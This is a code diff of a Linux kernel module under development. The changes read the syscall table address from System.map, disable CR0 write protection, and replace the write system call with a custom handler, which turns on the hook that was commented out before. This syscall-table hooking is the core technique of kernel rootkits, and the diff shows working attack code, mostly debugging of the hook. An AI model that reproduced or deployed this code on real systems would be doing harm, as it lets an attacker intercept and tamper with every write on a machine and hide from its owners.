@@ -18,8 +18,8 @@
 #define BOOT_PATH "/boot/System.map-"
 #define MAX_VERSION_LEN   256
 
-//unsigned long *syscall_table = NULL;
-unsigned long *syscall_table = (unsigned long *)0xffffffff81801400;
+unsigned long *syscall_table = NULL;
+//unsigned long *syscall_table = (unsigned long *)0xffffffff81801400;
 asmlinkage int (*original_write)(unsigned int, const char __user *, size_t);
 
 static int find_sys_call_table (char *kern_ver) {
@@ -45,6 +45,8 @@ static int find_sys_call_table (char *kern_ver) {
  
     oldfs = get_fs();
     set_fs (KERNEL_DS);
+
+    printk(KERN_EMERG "Kernel version: %s\n", kern_ver);
      
     filename = kmalloc(filename_length, GFP_KERNEL);
     if (filename == NULL) {
@@ -68,6 +70,7 @@ static int find_sys_call_table (char *kern_ver) {
      */
     f = filp_open(filename, O_RDONLY, 0);
     if (IS_ERR(f) || (f == NULL)) {
+        printk(KERN_EMERG "Error opening System.map-<version> file: %s\n", filename);
         return -1;
     }
  
@@ -106,8 +109,9 @@ static int find_sys_call_table (char *kern_ver) {
              
                 //syscall_table = (unsigned long long *) kstrtoll(sys_string, NULL, 16);
                 //syscall_table = kmalloc(sizeof(unsigned long *), GFP_KERNEL);
-                syscall_table = kmalloc(sizeof(syscall_table), GFP_KERNEL);
-                kstrtoul(sys_string, 16, syscall_table);
+                //syscall_table = kmalloc(sizeof(syscall_table), GFP_KERNEL);
+                kstrtoul(sys_string, 16, &syscall_table);
+                printk(KERN_EMERG "syscall_table retrieved\n");
                  
                 kfree(sys_string);
                  
@@ -199,31 +203,19 @@ asmlinkage int new_write (unsigned int x, const char __user *y, size_t size) {
 static int __init onload(void) {
   char *kernel_version = kmalloc(MAX_VERSION_LEN, GFP_KERNEL);
   printk(KERN_WARNING "Hello world!\n");
-  printk(KERN_EMERG "Version: %s\n", acquire_kernel_version(kernel_version));
+ // printk(KERN_EMERG "Version: %s\n", acquire_kernel_version(kernel_version));
 
-
-//  find_sys_call_table(acquire_kernel_version());
+  find_sys_call_table(acquire_kernel_version(kernel_version));
 
   printk(KERN_EMERG "Syscall table address: %p\n", syscall_table);
   printk(KERN_EMERG "sizeof(unsigned long *): %zx\n", sizeof(unsigned long*));
   printk(KERN_EMERG "sizeof(sys_call_table) : %zx\n", sizeof(syscall_table));
 
   if (syscall_table != NULL) {
-//    struct page *_sys_call_page;
-//    _sys_call_page = virt_to_page(&syscall_table);
-//    pages_rw(_sys_call_page, 1);
-    
-
-//    preempt_disable();
-//    local_irq_disable();
-//    barrier();
-//    write_cr0 (read_cr0 () & (~ 0x10000));
-//    original_write = (void *)syscall_table[__NR_write];
-//    syscall_table[__NR_write] = &new_write;
-//    write_cr0 (read_cr0 () | 0x10000);
-//    barrier();
-//    local_irq_enable();
-//    preempt_enable();
+    write_cr0 (read_cr0 () & (~ 0x10000));
+    original_write = (void *)syscall_table[__NR_write];
+    syscall_table[__NR_write] = &new_write;
+    write_cr0 (read_cr0 () | 0x10000);
     printk(KERN_EMERG "[+] onload: sys_call_table hooked\n");
   } else {
     printk(KERN_EMERG "[-] onload: syscall_table is NULL\n");
@@ -239,15 +231,9 @@ static int __init onload(void) {
 
 static void __exit onunload(void) {
   if (syscall_table != NULL) {
-//    preempt_disable();
-//    local_irq_disable();
-//    barrier();
-//    write_cr0 (read_cr0 () & (~ 0x10000));
-//    syscall_table[__NR_write] = original_write;
-//    write_cr0 (read_cr0 () | 0x10000);
-//    barrier();
-//    local_irq_enable();
-//    preempt_enable();
+    write_cr0 (read_cr0 () & (~ 0x10000));
+    syscall_table[__NR_write] = original_write;
+    write_cr0 (read_cr0 () | 0x10000);
     printk(KERN_EMERG "[+] onunload: sys_call_table unhooked\n");
   } else {
     printk(KERN_EMERG "[-] onunload: syscall_table is NULL\n");
